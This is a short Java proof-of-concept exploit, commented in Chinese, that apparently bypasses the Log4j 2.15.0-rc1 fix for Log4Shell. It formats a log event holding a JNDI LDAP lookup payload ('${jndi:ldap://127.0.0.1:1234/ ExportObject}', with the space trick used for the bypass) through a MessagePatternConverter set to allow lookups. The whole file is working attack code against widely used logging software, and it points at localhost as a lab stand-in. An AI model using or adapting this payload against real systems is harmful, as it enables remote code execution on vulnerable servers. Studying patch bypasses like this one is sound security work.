import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.DefaultConfiguration;
import org.apache.logging.log4j.core.impl.MutableLogEvent;
import org.apache.logging.log4j.core.pattern.MessagePatternConverter;

import java.util.function.LongFunction;

// 鸡肋绕过 rc1 的 EXP，Windows 无法触发
public class BypassRc1EXP {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger(LongFunction.class);

        Configuration configuration = new DefaultConfiguration();
        MessagePatternConverter messagePatternConverter = MessagePatternConverter.newInstance(configuration,
                                                        new String[]{"lookups"});
        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:1234/ ExportObject}"),null);
        messagePatternConverter.format(logEvent,new StringBuilder("${jndi:ldap://127.0.0.1:1234/ ExportObject}"));
    }
}
